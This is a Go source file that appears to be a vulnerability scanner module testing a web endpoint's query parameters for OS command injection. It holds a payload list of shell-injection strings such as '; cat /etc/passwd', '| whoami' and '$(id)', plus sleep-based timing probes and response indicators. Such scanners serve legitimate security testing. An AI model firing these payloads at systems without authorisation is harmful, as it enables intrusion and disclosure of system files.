package native

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

type CmdInjectionResult struct {
	Endpoint   string `json:"endpoint"`
	Parameter  string `json:"parameter"`
	Payload    string `json:"payload"`
	Vulnerable bool   `json:"vulnerable"`
	Evidence   string `json:"evidence"`
}

func TestCmdInjection(baseURL string, params map[string]string) []CmdInjectionResult {
	payloads := []string{
		"; ping -c 1 127.0.0.1",
		"| ping -c 1 127.0.0.1",
		"& ping -c 1 127.0.0.1 &",
		"&& ping -c 1 127.0.0.1",
		"`ping -c 1 127.0.0.1`",
		"$(ping -c 1 127.0.0.1)",
		"; echo VULN_TEST_123",
		"| echo VULN_TEST_123",
		"& echo VULN_TEST_123 &",
		"&& echo VULN_TEST_123",
		"`echo VULN_TEST_123`",
		"$(echo VULN_TEST_123)",
		"; sleep 2",
		"| sleep 2",
		"& sleep 2 &",
		"&& sleep 2",
		"; whoami",
		"| whoami",
		"& whoami &",
		"&& whoami",
		"; id",
		"| id",
		"; ls -la",
		"| ls -la",
		"; cat /etc/passwd",
		"| cat /etc/passwd",
		"`id`",
		"`whoami`",
		"$(id)",
		"$(whoami)",
	}

	cmdIndicators := []string{
		"VULN_TEST_123",
		"uid=", "gid=", "groups=",
		"root:x:0:0:", "root:!:0:0:",
		"ping", "icmp_seq",
		"1 received", "0% packet loss",
		"www-data", "nobody", "apache",
		"bin", "daemon",
		"Microsoft", "Windows",
		"total ", "drwxr", "-rw-r",
	}

	timeSensitivePayloads := []string{
		"; sleep 2",
		"| sleep 2",
		"& sleep 2 &",
		"&& sleep 2",
		"`sleep 2`",
		"$(sleep 2)",
	}

	client := &http.Client{Timeout: 15 * time.Second}
	var results []CmdInjectionResult

	baselineStart := time.Now()
	baselineResp, err := client.Get(baseURL)
	baselineTime := time.Since(baselineStart)
	if err == nil {
		baselineResp.Body.Close()
	}

	for param, origVal := range params {
		for _, payload := range payloads {
			req, _ := http.NewRequest("GET", baseURL, nil)
			q := req.URL.Query()
			for k, v := range params {
				if k == param {
					q.Set(k, origVal+payload)
				} else {
					q.Set(k, v)
				}
			}
			req.URL.RawQuery = q.Encode()

			start := time.Now()
			resp, err := client.Do(req)
			elapsed := time.Since(start)
			if err != nil {
				continue
			}

			var bodyStr string
			if resp.StatusCode == 200 {
				body, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
				if err == nil {
					bodyStr = string(body)
				}
			}
			resp.Body.Close()

			for _, indicator := range cmdIndicators {
				if strings.Contains(bodyStr, indicator) {
					results = append(results, CmdInjectionResult{
						Endpoint:   baseURL,
						Parameter:  param,
						Payload:    payload,
						Vulnerable: true,
						Evidence:   fmt.Sprintf("Command output '%s' reflected in response", indicator),
					})
					break
				}
			}

			isTimePayload := false
			for _, tp := range timeSensitivePayloads {
				if payload == tp {
					isTimePayload = true
					break
				}
			}
			if isTimePayload && elapsed > 2*time.Second && elapsed > baselineTime*3 {
				results = append(results, CmdInjectionResult{
					Endpoint:   baseURL,
					Parameter:  param,
					Payload:    payload,
					Vulnerable: true,
					Evidence:   fmt.Sprintf("Time-based injection: %.2fs response (baseline: %.2fs)", elapsed.Seconds(), baselineTime.Seconds()),
				})
			}
		}
	}

	if len(results) == 0 {
		results = append(results, CmdInjectionResult{
			Endpoint: baseURL,
			Evidence: fmt.Sprintf("No command injection detected across %d payloads on %d parameters", len(payloads), len(params)),
		})
	}

	return results
}
